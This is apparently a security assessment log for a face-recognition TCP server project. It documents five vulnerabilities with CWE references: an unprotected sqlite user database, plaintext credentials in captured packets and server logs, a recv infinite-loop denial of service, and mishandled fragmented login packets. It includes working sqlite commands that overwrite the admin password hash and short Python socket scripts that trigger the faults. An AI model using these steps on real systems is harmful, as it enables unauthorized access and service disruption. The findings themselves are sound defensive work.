06/23
V01) insert a arbitrary id/password to DB
	Compromise Sequence
		1. modify tartan_user.db. insert new user with the SHA256 hashed password or replace the user's passwd.
		2. login success using new or modified user

	Vulnerabilities
		V01-1. sqlite3 database files(tartan_faces.db, tartan_user.db) have no password. So it can be accessed and modified by an attacker.
			CWE-916: Use of Password Hash With Insufficient Computational Effort https://cwe.mitre.org/data/definitions/916.html
			CWE-862: Missing Authorization https://cwe.mitre.org/data/definitions/862.html

	Approach
		V01-1.
			From install guide(tartan_install.sh), we found some db files are installed. 
				$ cat tartan_install.sh
				....
				install tartan*.db /usr/local/tartan/
				....

			So we checked the tartan* db with sqlite3. it doesn't request any password, so we could check the data in the table.
			It consists of id, account, passwd, privilege columns. But the passwd field would be encrypted or hashed.
				$ sqlite3 tartan_user.db
				SQLite version 3.22.0 2018-01-22 18:45:57
				Enter ".help" for usage hints.
				sqlite> .table
				user

				sqlite> .schema user
				CREATE TABLE user (id INTEGER PRIMARY KEY AUTOINCREMENT , account TEXT, passwd TEXT, privilege INT);

				sqlite> select * from user;
				1|admin|e9b6ebe030d910d3b0c253b9bd05dfc365f1e17f61f2b64385898a8247b5b792|0
				2|lg|078156fd9debb7d481347e68ab19bb1f2d3028bcd61bc25994562f8a0d62e8e1|2

			To understand the logic related in the user credentials, we checked the source codes. So we found some code snippets related in the user id and the password.
			So we found that the SHA256 is used for the passwd.
				< mydb.cpp >
				gboolean
				CMydb::initialize_database_account()
				{
					...
					const char *sql = "DROP TABLE IF EXISTS user;"
									  "CREATE TABLE user (id INTEGER PRIMARY KEY AUTOINCREMENT , account TEXT, passwd TEXT, privilege INT);"
									  "INSERT INTO user VALUES(1, 'admin', 'e9b6ebe030d910d3b0c253b9bd05dfc365f1e17f61f2b64385898a8247b5b792' ,0);"
									  "INSERT INTO user VALUES(2, 'lg', '078156fd9debb7d481347e68ab19bb1f2d3028bcd61bc25994562f8a0d62e8e1' ,2);";
					...
				}
				
				< auth.cpp >
				int CAuth::login(string id, string passwd)
				{
					CMydb db;
					CCyper cyp;
					return db.find_user(id, cyp.get_passwd_enc(passwd));
				}

				< cyper.cpp >
				string
				CCyper::get_passwd_enc(string pass)
				{
					unsigned char digest[SHA256_DIGEST_LENGTH];

					SHA256_CTX ctx;
					SHA256_Init(&ctx);
					SHA256_Update(&ctx, pass.c_str(), pass.length());
					SHA256_Final(digest, &ctx);

					string str=bytes2hex(digest,SHA256_DIGEST_LENGTH );
					// printf("SHA256 digest: %s\n", str.c_str());
					return str;
				}

			Finally we change the db to what we want. Change the admin paswd to SHA256 hashed value of 'lg' and add new 'user'.
			So we can login 'admin/lg' and 'user/user' in the client program
				sqlite> replace into user values (1,'admin','0e6ba33f8bc8f41515b9d77c0e27c07ad66f2ae9b09dd7561729d6cd4d27c292',0);
				sqlite> insert into user values (3,'user','04f8996da763b7a969b1028ee3007569eaf3a635486ddab211d512c85b9df8fb',2);
				sqlite> select * from user;
				1|admin|0e6ba33f8bc8f41515b9d77c0e27c07ad66f2ae9b09dd7561729d6cd4d27c292|0
				2|lg|078156fd9debb7d481347e68ab19bb1f2d3028bcd61bc25994562f8a0d62e8e1|2
				3|user|04f8996da763b7a969b1028ee3007569eaf3a635486ddab211d512c85b9df8fb|2

06/24
V02) sniffing the id/password
	Compromise Sequence
		1. sniffing the network packet through Wireshark.
		2. select the 'Non secure' mode and push login button
		3. the id/password is checked by captured packet

	Vulnerabilities
		V02-1. the communication channel for the user credentials is not secure
			CWE-319: Cleartext Transmission of Sensitive Information https://cwe.mitre.org/data/definitions/319.html

	Approach
		V02-1.
			Capture TCP Packet using port number 50000 (=non-secure port)
			See wireshark packet in './V02/tcp_packet.pcapng'.
				No.     Time           Source                Destination           Protocol Length Info
					  4 0.126187       192.168.0.217         192.168.0.228         TCP      81     11505 â†’ 50000 [PSH, ACK] Seq=1 Ack=1 Win=204800 Len=27

				Frame 4: 81 bytes on wire (648 bits), 81 bytes captured (648 bits) on interface \Device\NPF_{0BA61C95-3362-49D2-9950-76429883512C}, id 0
				Ethernet II, Src: EFMNetwo_4c:1a:37 (00:26:66:4c:1a:37), Dst: IntelCor_da:66:5a (8c:c6:81:da:66:5a)
				Internet Protocol Version 4, Src: 192.168.0.217, Dst: 192.168.0.228
				Transmission Control Protocol, Src Port: 11505, Dst Port: 50000, Seq: 1, Ack: 1, Len: 27
				Data (27 bytes)

				0000  8c c6 81 da 66 5a 00 26 66 4c 1a 37 08 00 45 00   ....fZ.&fL.7..E.
				0010  00 43 98 24 40 00 80 06 df 82 c0 a8 00 d9 c0 a8   .C.$@...........
				0020  00 e4 2c f1 c3 50 02 60 87 7e bd 7a b0 8d 50 18   ..,..P.`.~.z..P.
				0030  c8 00 75 c5 00 00 53 42 31 54 1b 00 00 00 c7 8c   ..u...SB1T......
				0040  07 3c e8 03 00 00 0a 05 61 64 6d 69 6e 12 02 6c   .<......admin..l    ## It shows that the user id 'admin' and the password 'lg' are exposed.
				0050  67                                                g


V03) exposed user credentials in the server log
	Compromise Sequence
		1. start server and trace the logs ({git_repo_root}/LgFaceRecDemoTCP_Jetson_NanoV2/log.sh)
		2. attempt to login
		3. the logs show the user credentials including password like below.	
			Jun 23 04:17:54 LgFaceRecProject LgFaceRecDemoTCP_Jetson_NanoV2[7447]: ACCOUNT=user PASSWORD=user
			Jun 23 04:17:54 LgFaceRecProject LgFaceRecDemoTCP_Jetson_NanoV2[7447]:  id:3  account:user, passwd:04f8996da763b7a969b1028ee3007569eaf3a635486ddab211d512c85b9df8fb, privilege:2
			Jun 23 04:17:54 LgFaceRecProject LgFaceRecDemoTCP_Jetson_NanoV2[7447]: OK You're a valid user : privilege=2
		
	Vulnerabilities
		V03-1. the logging information exposes too much information
			CWE-532: Insertion of Sensitive Information into Log File https://cwe.mitre.org/data/definitions/532.html
		
	Approach
		V03-1. just monitoring the log. we have no idea to find this vulnerability.


V04) infinite loop in the NetworkTCP.cpp
	Compromise Sequence
		1. execute 'python3 client.py'
			$ cat ./client.py
			#!/usr/bin/env python3

			import socket

			HOST = '192.168.0.228'
			PORT = 50000

			with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
				s.connect((HOST, PORT))
				s.sendall(b'Hello, world')
		
	Vulnerabilities
		V04-1. infinite loop in the ReadDataTcp function. because it doesn't handle the return value of 'recv' function correctly. it causes the denial of service.
			CWE-253: Incorrect Check of Function Return Value https://cwe.mitre.org/data/definitions/253.html

	Approach
		V04-1.
			when checking the man page of recv, it can return the 0 when a peer is disconnected.
				$ man recv
				...
				RETURN VALUE
				...
				When a stream socket peer has performed an orderly shutdown, the return value will be  0  (the
				traditional "end-of-file" return).
				...
				
			But in the source codes, there is no handling of the return 0 of the recv function.
			So if 'length' param is more than 0 and the recv returns 0 by disconnecting of the peer, the for loop is infinite. 
				< NetworkTCP.cpp >
				ssize_t ReadDataTcp(TTcpConnectedPort *TcpConnectedPort,unsigned char *data, size_t length)
				{
					...
					for (size_t i = 0; i < length; i += bytes)
					{
						if ((bytes = recv(TcpConnectedPort->ConnectedFd, (char *)(data+i), length  - i,0)) == -1) 
						{
							return (-1);
						}
						accumulated+=bytes;
						if (i==0) {
							...
						}
						if (my_packet_size==-1) {
							...
						}
						printf("accumulated packets=%zu   my_packet_size=%zd\n",accumulated, my_packet_size );
						if (my_packet_size>0 && accumulated>=my_packet_size)
							return accumulated;
					}
					return(length);
				}

V05) Unintentional handling of the protocol message
	Compromise Sequence
		1. <normal case> execute python statements below. and confirm login success
			>>> import socket
			>>> s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			>>> s.connect(('192.168.0.228', 50000))
			>>> s.sendall(b'\x53\x42\x31\x54\x1b\x00\x00\x00\xc7\x8c\x07\x3c\xe8\x03\x00\x00\x0a\x05\x61\x64\x6d\x69\x6e\x12\x02\x6c\x67') # send login protocol message with id:pass=admin:lg
			
		2. logout confirm by the statement below
			>>> s.close()
			
		3. <NG case> execute python statements below. and login is not succeeded.
			>>> import time
			>>> s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			>>> s.connect(('192.168.0.228', 50000)) # connect to the server
			>>> s.sendall(b'\x53\x42\x31\x54') # send preamble "SB1T" 1st
			>>> time.sleep(1) # wait
			>>> s.sendall(b'\x1b\x00\x00\x00\xc7\x8c\x07\x3c\xe8\x03\x00\x00\x0a\x05\x61\x64\x6d\x69\x6e\x12\x02\x6c\x67') # send remain payload to login
	
	Vulnerabilities
		V05-1. The length parameter is set abnormally in case of sending the preamble "SB1T" only
			CAPEC-494: TCP Fragmentation https://capec.mitre.org/data/definitions/494.html
		
	Approach
		V05-1. 
			When receiving the 4bytes "SB1T" only and entering "if (i==0)" statement, the "MyPacket *p" is not filled enough.
			Caller initializes the all memory pointing of data to zero. So in this case, only p->hdr.head is written to the data of the received packet and others are zero.
			Finally, my_packet_size is changed to 0 and the next receiving data is not parsed correctly. And then keep looping until receiving the size of the value of 'length' input param.
			
			< NetworkTCP.cpp >
			ssize_t ReadDataTcp(TTcpConnectedPort *TcpConnectedPort,unsigned char *data, size_t length) // all memory pointing of data is zero. length is PACKET_MAX_BUFFER_SIZE (=1024 * 1024)
			{
				ssize_t bytes;
				ssize_t my_packet_size=-1;
				ssize_t accumulated=0;

				for (size_t i = 0; i < length; i += bytes)
				{
					if ((bytes = recv(TcpConnectedPort->ConnectedFd, (char *)(data+i), length  - i,0)) == -1)  // receiving 4 bytes "SB1T"
					{
						return (-1);
					}
					accumulated+=bytes;
					if (i==0) {
						MyPacket *p=(MyPacket*)data; // data is "SB1T\0\0\0\0\0\0\0...\0".
						printf("max packet length=%zu received=%zu packet_length=%d timestamp=%u msgtype=%d\n", 
									length, bytes, p->hdr.size , p->hdr.timestamp, p->hdr.msgtype);
						if (p->hdr.head[0]=='S' && p->hdr.head[1]=='B' && p->hdr.head[2]=='1' && p->hdr.head[3]=='T') {
							my_packet_size=p->hdr.size; // p->hdr.size is 0
						}
						// print_pkt_header(data,60);
					}
					...
					if (my_packet_size>0 && accumulated>=my_packet_size) // when total received data is more than PACKET_MAX_BUFFER_SIZE, return the function.
						return accumulated;
				}
				return(length);
			}
			
			< ProtocolDef.h >
			#pragma pack(push, 1)
			typedef  struct {
				unsigned char head[4];
				uint32_t size;
				uint32_t timestamp;
				uint32_t msgtype;
			} MyPacketHeader;

			typedef  struct {
				MyPacketHeader hdr;
				unsigned char payload[0];
			} MyPacket;
			#pragma pack(pop)
